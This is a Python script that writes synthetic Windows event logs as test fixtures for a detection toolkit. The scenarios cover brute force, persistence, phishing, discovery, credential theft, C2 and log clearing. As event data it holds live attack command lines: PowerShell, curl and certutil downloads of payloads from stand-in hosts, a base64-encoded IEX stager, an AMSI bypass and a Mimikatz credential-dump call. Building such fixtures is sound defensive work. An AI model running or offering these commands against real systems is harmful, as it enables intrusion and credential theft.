"""Synthetic Windows event generator for evtxkit. One JSON-Lines file per
detector scenario (mirrors trafkit's make_pcaps.py / waapkit's
make_logs.py: one script, everything reproducible from it), plus a
clean-baseline pair (JSON-Lines events + a PowerShell history file) that
must trigger zero findings from every registered detector under a default
Config().

Run: python tools/make_evtx_events.py [output_dir]   (defaults to samples/evtxkit)
"""

from __future__ import annotations

import json
import os
import sys
from datetime import datetime, timedelta, timezone

UTC = timezone.utc
BASE = datetime(2026, 9, 6, 9, 0, 0, tzinfo=UTC)


def evt(index_unused, event_id, channel, ts, computer="WIN-VICTIM01", **data) -> dict:
    return {
        "EventID": event_id,
        "Channel": channel,
        "TimeCreated": ts.isoformat(),
        "Computer": computer,
        "EventData": {k: v for k, v in data.items() if v is not None},
    }


def write_jsonl(path: str, records: list[dict]) -> None:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        for r in records:
            fh.write(json.dumps(r) + "\n")
    print(f"wrote {path} ({len(records)} records)")


def write_text(path: str, lines: list[str]) -> None:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + "\n")
    print(f"wrote {path} ({len(lines)} lines)")


# ---------------------------------------------------------------------------
# Initial Access: RDP / network logon brute force
# ---------------------------------------------------------------------------
def build_rdp_brute_force(out_dir: str) -> None:
    t = BASE
    records = []
    attacker_ip = "203.0.113.77"
    usernames = ["administrator", "admin", "support", "test", "user", "backup", "sql", "guest"]
    for i in range(20):
        records.append(evt(i, 4625, "Security", t,
                            TargetUserName=usernames[i % len(usernames)],
                            LogonType=10, IpAddress=attacker_ip, IpPort="51000",
                            SubStatus="0xC000006A"))
        t += timedelta(seconds=8)
    t += timedelta(seconds=30)
    # the guessed password succeeds
    records.append(evt(20, 4624, "Security", t,
                        TargetUserName="Administrator", TargetLogonId="0x9f3a21",
                        LogonType=10, IpAddress=attacker_ip, IpPort="51009"))
    write_jsonl(os.path.join(out_dir, "rdp_brute_force.jsonl"), records)


# ---------------------------------------------------------------------------
# Persistence: backdoored user account
# ---------------------------------------------------------------------------
def build_backdoor_user(out_dir: str) -> None:
    t = BASE
    records = []
    attacker_ip = "203.0.113.77"
    creator_logon_id = "0x9f3a21"

    # creator's own logon (correlatable via Logon ID)
    records.append(evt(0, 4624, "Security", t, TargetUserName="Administrator",
                        TargetLogonId=creator_logon_id, LogonType=10, IpAddress=attacker_ip))
    t += timedelta(minutes=5)

    # new backdoor account created
    records.append(evt(1, 4720, "Security", t, SubjectUserName="Administrator",
                        SubjectLogonId=creator_logon_id, TargetUserName="mr.backd00r",
                        SamAccountName="mr.backd00r"))
    t += timedelta(minutes=2)

    # immediately made an admin
    records.append(evt(2, 4732, "Security", t, SubjectUserName="Administrator",
                        SubjectLogonId=creator_logon_id, MemberName="WIN-VICTIM01\\mr.backd00r",
                        TargetUserName="Administrators"))
    t += timedelta(minutes=10)

    # unrelated: an existing account added to a sensitive group, no matching 4720
    records.append(evt(3, 4732, "Security", t, SubjectUserName="Administrator",
                        SubjectLogonId=creator_logon_id, MemberName="WIN-VICTIM01\\svc_helpdesk",
                        TargetUserName="Remote Desktop Users"))
    t += timedelta(minutes=5)

    # a password reset on an old account
    records.append(evt(4, 4724, "Security", t, SubjectUserName="Administrator",
                        SubjectLogonId=creator_logon_id, TargetUserName="svc_sysrestore"))

    write_jsonl(os.path.join(out_dir, "backdoor_user.jsonl"), records)


# ---------------------------------------------------------------------------
# Persistence: service / scheduled task / startup / run key
# ---------------------------------------------------------------------------
def build_persistence(out_dir: str) -> None:
    t = BASE
    records = []

    records.append(evt(0, 1, "Sysmon", t, Image="C:\\Windows\\System32\\sc.exe",
                        ParentImage="C:\\Windows\\System32\\cmd.exe",
                        CommandLine='sc create "BadService" binpath= "C:\\ProgramData\\svc.exe" start= auto',
                        ProcessId="5001", ProcessGuid="{guid-sc}"))
    t += timedelta(seconds=3)

    records.append(evt(1, 1, "Sysmon", t, Image="C:\\Windows\\System32\\schtasks.exe",
                        ParentImage="C:\\Windows\\System32\\cmd.exe",
                        CommandLine='schtasks /create /tn "BadTask" /tr "C:\\Temp\\malware.exe" /sc onstart /ru System',
                        ProcessId="5002", ProcessGuid="{guid-schtasks}"))
    t += timedelta(seconds=3)

    records.append(evt(2, 11, "Sysmon", t, Image="C:\\Windows\\explorer.exe",
                        TargetFilename="C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malware.exe"))
    t += timedelta(seconds=3)

    records.append(evt(3, 13, "Sysmon", t, Image="C:\\Windows\\System32\\reg.exe",
                        TargetObject="HKU\\S-1-5-21-111\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\BadKey",
                        Details="C:\\ProgramData\\svc.exe"))

    write_jsonl(os.path.join(out_dir, "persistence.jsonl"), records)


# ---------------------------------------------------------------------------
# Initial Access: phishing double-extension / archive attachment
# ---------------------------------------------------------------------------
def build_phishing_attachment(out_dir: str) -> None:
    t = BASE
    records = []

    records.append(evt(0, 1, "Sysmon", t, Image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                        ParentImage="C:\\Windows\\explorer.exe", ProcessId="6001", ProcessGuid="{guid-edge}"))
    t += timedelta(seconds=20)

    records.append(evt(1, 11, "Sysmon", t, Image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                        TargetFilename="C:\\Users\\victim\\Downloads\\invoice.zip"))
    t += timedelta(seconds=15)

    records.append(evt(2, 11, "Sysmon", t, Image="C:\\Windows\\explorer.exe",
                        TargetFilename="C:\\Users\\victim\\Downloads\\invoice.pdf.exe"))
    drop_ts = t
    t += timedelta(seconds=45)

    records.append(evt(3, 1, "Sysmon", t, Image="C:\\Users\\victim\\Downloads\\invoice.pdf.exe",
                        ParentImage="C:\\Windows\\explorer.exe", ProcessId="6010", ProcessGuid="{guid-invoice}"))
    assert (t - drop_ts).total_seconds() < 600

    write_jsonl(os.path.join(out_dir, "phishing_attachment.jsonl"), records)


# ---------------------------------------------------------------------------
# Initial Access: LNK phishing -> PowerShell -> RemcosRAT
# ---------------------------------------------------------------------------
def build_lnk_phishing(out_dir: str) -> None:
    t = BASE
    records = []

    records.append(evt(0, 11, "Sysmon", t, Image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                        TargetFilename="C:\\Users\\victim\\Downloads\\Visit Our Website!.lnk"))
    lnk_ts = t
    t += timedelta(seconds=40)

    payload = ("-c (New-object System.Net.WebClient).DownloadFile("
               "'https://breacheddomain.thm/FILTERED/r.exe','C:\\ProgramData\\r.exe'); start C:\\ProgramData\\r.exe;")
    records.append(evt(1, 1, "Sysmon", t, Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        ParentImage="C:\\Windows\\explorer.exe", CommandLine=payload,
                        ProcessId="6020", ProcessGuid="{guid-ps-lnk}"))
    assert (t - lnk_ts).total_seconds() < 120

    write_jsonl(os.path.join(out_dir, "lnk_phishing.jsonl"), records)


# ---------------------------------------------------------------------------
# Initial Access: execution from a removable/non-system drive
# ---------------------------------------------------------------------------
def build_usb_execution(out_dir: str) -> None:
    t = BASE
    records = [
        evt(0, 1, "Sysmon", t, Image="E:\\Photos.exe", ParentImage="C:\\Windows\\explorer.exe",
            ProcessId="6030", ProcessGuid="{guid-usb}"),
    ]
    write_jsonl(os.path.join(out_dir, "usb_execution.jsonl"), records)


# ---------------------------------------------------------------------------
# Discovery: command sequence from one parent process
# ---------------------------------------------------------------------------
def build_discovery(out_dir: str) -> None:
    t = BASE
    records = []

    records.append(evt(0, 1, "Sysmon", t, Image="C:\\Users\\victim\\Downloads\\invoice.pdf.exe",
                        ParentImage="C:\\Windows\\explorer.exe", ProcessId="7000", ProcessGuid="{guid-root}"))
    t += timedelta(seconds=5)

    records.append(evt(1, 1, "Sysmon", t, Image="C:\\Windows\\System32\\cmd.exe",
                        ParentImage="C:\\Users\\victim\\Downloads\\invoice.pdf.exe",
                        ParentProcessGuid="{guid-root}", ProcessId="7001", ProcessGuid="{guid-cmd}"))
    t += timedelta(seconds=5)

    discovery_steps = [
        ("C:\\Windows\\System32\\ipconfig.exe", "ipconfig /all"),
        ("C:\\Windows\\System32\\whoami.exe", "whoami /priv"),
        ("C:\\Windows\\System32\\cmd.exe", "cmd /c dir"),
        ("C:\\Windows\\System32\\net.exe", "net user"),
        ("C:\\Windows\\System32\\tasklist.exe", "tasklist /v"),
        ("C:\\Windows\\System32\\wbem\\WMIC.exe", "wmic computersystem get model"),
    ]
    for i, (image, cmdline) in enumerate(discovery_steps):
        records.append(evt(2 + i, 1, "Sysmon", t, Image=image, CommandLine=cmdline,
                            ParentImage="C:\\Windows\\System32\\cmd.exe", ParentProcessGuid="{guid-cmd}",
                            ProcessId=str(7010 + i)))
        t += timedelta(seconds=10)

    write_jsonl(os.path.join(out_dir, "discovery.jsonl"), records)

    write_text(os.path.join(out_dir, "discovery_ConsoleHost_history.txt"), [
        "Get-ChildItem",
        "Get-LocalUser",
        "Get-Service",
        "Get-WmiObject -Namespace \"root\\SecurityCenter2\" -Query \"SELECT * FROM AntivirusProduct\"",
        "ipconfig /all",
    ])


# ---------------------------------------------------------------------------
# Collection / Credential Access / staging
# ---------------------------------------------------------------------------
def build_collection(out_dir: str) -> None:
    t = BASE
    records = []

    records.append(evt(0, 1, "Sysmon", t, Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        CommandLine="copy C:\\Users\\victim\\AppData\\Roaming\\Signal C:\\Temp\\",
                        ParentImage="C:\\Windows\\System32\\cmd.exe", ProcessId="8001"))
    t += timedelta(seconds=20)

    records.append(evt(1, 1, "Sysmon", t, Image="C:\\Windows\\System32\\cmd.exe",
                        CommandLine="type debug-logs.txt | findstr password > C:\\Temp\\passwords.txt",
                        ParentImage="C:\\Windows\\System32\\cmd.exe", ProcessId="8002"))
    t += timedelta(seconds=20)

    records.append(evt(2, 1, "Sysmon", t, Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        CommandLine="Compress-Archive C:\\Temp\\ C:\\Temp\\stolen_data.zip",
                        ParentImage="C:\\Windows\\System32\\cmd.exe", ProcessId="8003"))
    t += timedelta(seconds=20)

    # data stealer: one process touching several sensitive categories via
    # file events alone, no CMD/PowerShell commands involved
    stealer_image = "C:\\Users\\victim\\AppData\\Local\\Temp\\upd.exe"
    for target in (
        "C:\\Users\\victim\\AppData\\Roaming\\Signal\\db.sqlite",
        "C:\\Users\\victim\\AppData\\Roaming\\Bitcoin\\wallet.dat",
        "C:\\Users\\victim\\AppData\\Roaming\\Telegram Desktop\\tdata\\session",
    ):
        records.append(evt(len(records), 11, "Sysmon", t, Image=stealer_image, TargetFilename=target))
        t += timedelta(seconds=5)

    write_jsonl(os.path.join(out_dir, "collection.jsonl"), records)


# ---------------------------------------------------------------------------
# Command and Control: ingress tool transfer + suspicious network activity
# ---------------------------------------------------------------------------
def build_c2_transfer(out_dir: str) -> None:
    t = BASE
    records = []

    records.append(evt(0, 1, "Sysmon", t, Image="C:\\Windows\\System32\\cmd.exe",
                        ParentImage="C:\\Windows\\explorer.exe", ProcessId="9001"))
    t += timedelta(seconds=5)

    records.append(evt(1, 1, "Sysmon", t, Image="C:\\Windows\\System32\\curl.exe",
                        CommandLine="curl.exe http://appsforfree.thm/trojan.exe -o C:\\ProgramData\\good.exe",
                        ParentImage="C:\\Windows\\System32\\cmd.exe", ProcessId="9002"))
    transfer_ts = t
    t += timedelta(seconds=4)

    records.append(evt(2, 3, "Sysmon", t, Image="C:\\Windows\\System32\\curl.exe",
                        ProcessId="9002", DestinationHostname="appsforfree.thm",
                        DestinationIp="198.51.100.9", DestinationPort="80"))
    assert (t - transfer_ts).total_seconds() < 30
    t += timedelta(minutes=2)

    # staged secondary payload: unrelated process, non-standard location, own outbound connection
    records.append(evt(3, 3, "Sysmon", t, Image="C:\\ProgramData\\r.exe", ProcessId="9050",
                        DestinationIp="203.0.113.222", DestinationPort="4444"))

    write_jsonl(os.path.join(out_dir, "c2_transfer.jsonl"), records)


# ---------------------------------------------------------------------------
# Clean baseline: ordinary admin/user activity that must trigger nothing
# ---------------------------------------------------------------------------
def build_clean_baseline(out_dir: str) -> None:
    t = BASE
    records = []

    # a single mistyped-password failure from an *internal* IP -- not
    # counted toward brute force (external_ip_only) and, even if it were,
    # far below the attempts threshold.
    records.append(evt(0, 4625, "Security", t, TargetUserName="jdoe", LogonType=2,
                        IpAddress="10.0.5.12", SubStatus="0xC000006A"))
    t += timedelta(seconds=10)
    records.append(evt(1, 4624, "Security", t, TargetUserName="jdoe", TargetLogonId="0x111111",
                        LogonType=2, IpAddress="10.0.5.12"))
    t += timedelta(minutes=10)

    # ordinary browsing: a non-executable download that is never "run"
    records.append(evt(2, 1, "Sysmon", t, Image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                        ParentImage="C:\\Windows\\explorer.exe", ProcessId="1001"))
    t += timedelta(seconds=30)
    records.append(evt(3, 11, "Sysmon", t, Image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                        TargetFilename="C:\\Users\\jdoe\\Downloads\\quarterly_report.pdf"))
    t += timedelta(minutes=20)

    # one IT admin checking their own IP -- a single discovery-shaped
    # command, well isolated, never clustered with anything else
    records.append(evt(4, 1, "Sysmon", t, Image="C:\\Windows\\System32\\ipconfig.exe",
                        CommandLine="ipconfig /all", ParentImage="C:\\Windows\\System32\\cmd.exe", ProcessId="1010"))
    t += timedelta(hours=2)

    # a routine outbound connection from a normal browser
    records.append(evt(5, 3, "Sysmon", t, Image="C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                        ProcessId="1001", DestinationHostname="www.microsoft.com", DestinationIp="20.70.246.20"))

    write_jsonl(os.path.join(out_dir, "clean_baseline.jsonl"), records)

    write_text(os.path.join(out_dir, "clean_baseline_ConsoleHost_history.txt"), [
        "cd Documents",
        "Get-Process",
        "notepad todo.txt",
    ])


# ---------------------------------------------------------------------------
# Security-log-only intrusion (no Sysmon installed): Security 4688 process
# creation carries the whole chain -- the common real-world case. 4688 writes
# PIDs in hex, the *creator* in ProcessId, and the RDP logon arrives as an
# IPv4-mapped IPv6 address.
# ---------------------------------------------------------------------------
def build_security_only(out_dir: str) -> None:
    import base64
    t = BASE
    host = "WIN-FIN02"
    records = []
    records.append(evt(0, 4624, "Security", t, computer=host, TargetUserName="svc_reports",
                       TargetDomainName="CORP", TargetLogonId="0x5a1f00", LogonType=10,
                       IpAddress="::ffff:198.51.100.23", IpPort="50122"))
    t += timedelta(seconds=40)
    records.append(evt(1, 4688, "Security", t, computer=host, SubjectUserName="svc_reports",
                       SubjectLogonId="0x5A1F00", NewProcessId="0x1f40",
                       NewProcessName="C:\\Windows\\System32\\cmd.exe", ProcessId="0x1a2c",
                       ParentProcessName="C:\\Windows\\explorer.exe", CommandLine="cmd.exe",
                       TargetLogonId="0x0"))
    t += timedelta(seconds=5)
    for i, (image, cmdline) in enumerate([
        ("C:\\Windows\\System32\\whoami.exe", "whoami /all"),
        ("C:\\Windows\\System32\\net.exe", "net localgroup administrators"),
        ("C:\\Windows\\System32\\ipconfig.exe", "ipconfig /all"),
        ("C:\\Windows\\System32\\systeminfo.exe", "systeminfo"),
    ]):
        records.append(evt(2 + i, 4688, "Security", t, computer=host, SubjectUserName="svc_reports",
                           SubjectLogonId="0x5A1F00", NewProcessId=hex(0x1f50 + i),
                           NewProcessName=image, ProcessId="0x1f40",
                           ParentProcessName="C:\\Windows\\System32\\cmd.exe", CommandLine=cmdline,
                           TargetLogonId="0x0"))
        t += timedelta(seconds=8)
    records.append(evt(len(records), 4688, "Security", t, computer=host, SubjectUserName="svc_reports",
                       SubjectLogonId="0x5A1F00", NewProcessId="0x2000",
                       NewProcessName="C:\\Windows\\System32\\certutil.exe", ProcessId="0x1f40",
                       ParentProcessName="C:\\Windows\\System32\\cmd.exe",
                       CommandLine="certutil.exe -urlcache -split -f http://198.51.100.23/payload.exe "
                                   "C:\\Users\\Public\\payload.exe"))
    t += timedelta(seconds=30)
    stager = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a.ps1')"
    blob = base64.b64encode(stager.encode("utf-16-le")).decode()
    records.append(evt(len(records), 4688, "Security", t, computer=host, SubjectUserName="svc_reports",
                       SubjectLogonId="0x5A1F00", NewProcessId="0x2010",
                       NewProcessName="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                       ProcessId="0x1f40", ParentProcessName="C:\\Windows\\System32\\cmd.exe",
                       CommandLine=f"powershell.exe -nop -w hidden -enc {blob}"))
    t += timedelta(minutes=10)
    # 1102's fields live in UserData; flattened into EventData in this JSON form.
    records.append(evt(len(records), 1102, "Security", t, computer=host,
                       SubjectUserName="svc_reports", SubjectDomainName="CORP",
                       SubjectLogonId="0x5a1f00"))
    write_jsonl(os.path.join(out_dir, "security_only.jsonl"), records)


def _xml_event(eid, channel, provider, ts, computer, eventdata=None, userdata=None,
               record_id=1, pid=4, extra_system=""):
    ns = "http://schemas.microsoft.com/win/2004/08/events/event"
    parts = [f"<Event xmlns='{ns}'><System><Provider Name='{provider}'/>"
             f"<EventID>{eid}</EventID><TimeCreated SystemTime='{ts.strftime('%Y-%m-%dT%H:%M:%S.%f')}0Z'/>"
             f"<EventRecordID>{record_id}</EventRecordID>"
             f"<Execution ProcessID='{pid}' ThreadID='{pid + 8}'/>"
             f"<Channel>{channel}</Channel><Computer>{computer}</Computer>{extra_system}</System>"]
    if eventdata is not None:
        from xml.sax.saxutils import escape
        parts.append("<EventData>" + "".join(
            f"<Data Name='{k}'>{escape(str(v))}</Data>" for k, v in eventdata.items()) + "</EventData>")
    if userdata is not None:
        tag, fields = userdata
        parts.append(f"<UserData><{tag} xmlns='http://manifests.microsoft.com/win/2004/08/windows/eventlog'>"
                     + "".join(f"<{k}>{v}</{k}>" for k, v in fields.items())
                     + f"</{tag}></UserData>")
    parts.append("</Event>")
    return "".join(parts)


def write_xml(path: str, events: list[str]) -> None:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write('<?xml version="1.0" encoding="utf-8" standalone="yes"?>\n<Events>\n')
        fh.write("\n".join(events))
        fh.write("\n</Events>\n")
    print(f"wrote {path} ({len(events)} events)")


# ---------------------------------------------------------------------------
# Defense evasion, as an Event Viewer "Save as XML" export: the Security and
# System logs cleared (fields in UserData), next to a System-log event 1 --
# "system time changed" from Kernel-General -- that must NOT be mistaken for
# Sysmon process creation.
# ---------------------------------------------------------------------------
def build_log_cleared_xml(out_dir: str) -> None:
    t = BASE
    host = "WIN-VICTIM01"
    events = [
        _xml_event(1, "System", "Microsoft-Windows-Kernel-General", t, host,
                   eventdata={"NewTime": "2026-09-06T09:00:00Z", "OldTime": "2026-09-06T08:59:58Z",
                              "Image": "C:\\Windows\\System32\\svchost.exe"}, record_id=500),
        _xml_event(1102, "Security", "Microsoft-Windows-Eventlog", t + timedelta(minutes=30), host,
                   userdata=("LogFileCleared", {"SubjectUserSid": "S-1-5-21-1-2-3-1104",
                                                "SubjectUserName": "mr.backd00r",
                                                "SubjectDomainName": "WIN-VICTIM01",
                                                "SubjectLogonId": "0x9f3a21"}),
                   record_id=1),
        _xml_event(104, "System", "Microsoft-Windows-Eventlog", t + timedelta(minutes=31), host,
                   userdata=("LogFileCleared", {"SubjectUserName": "mr.backd00r",
                                                "SubjectDomainName": "WIN-VICTIM01",
                                                "Channel": "System", "BackupPath": ""}),
                   record_id=501),
    ]
    write_xml(os.path.join(out_dir, "log_cleared.xml"), events)


# ---------------------------------------------------------------------------
# PowerShell script block logging (4104), also as an XML export: an AMSI
# bypass and a Mimikatz invocation, next to an ordinary admin script block.
# ---------------------------------------------------------------------------
def build_scriptblocks_xml(out_dir: str) -> None:
    t = BASE
    host = "WIN-VICTIM01"
    channel = "Microsoft-Windows-PowerShell/Operational"
    provider = "Microsoft-Windows-PowerShell"
    blocks = [
        "Get-ChildItem C:\\Reports | Measure-Object -Property Length -Sum",
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
        ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
        "Invoke-Mimikatz -Command '\"privilege::debug\" \"sekurlsa::logonpasswords\"'",
    ]
    events = [
        _xml_event(4104, channel, provider, t + timedelta(seconds=20 * i), host,
                   eventdata={"MessageNumber": 1, "MessageTotal": 1, "ScriptBlockText": text,
                              "ScriptBlockId": f"{{0000000{i}-1111-2222-3333-444455556666}}",
                              "Path": ""},
                   record_id=900 + i, pid=4410)
        for i, text in enumerate(blocks)
    ]
    write_xml(os.path.join(out_dir, "powershell_scriptblocks.xml"), events)


def build_all(out_dir: str) -> None:
    build_security_only(out_dir)
    build_log_cleared_xml(out_dir)
    build_scriptblocks_xml(out_dir)
    build_rdp_brute_force(out_dir)
    build_backdoor_user(out_dir)
    build_persistence(out_dir)
    build_phishing_attachment(out_dir)
    build_lnk_phishing(out_dir)
    build_usb_execution(out_dir)
    build_discovery(out_dir)
    build_collection(out_dir)
    build_c2_transfer(out_dir)
    build_clean_baseline(out_dir)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "samples", "evtxkit")
    build_all(target)
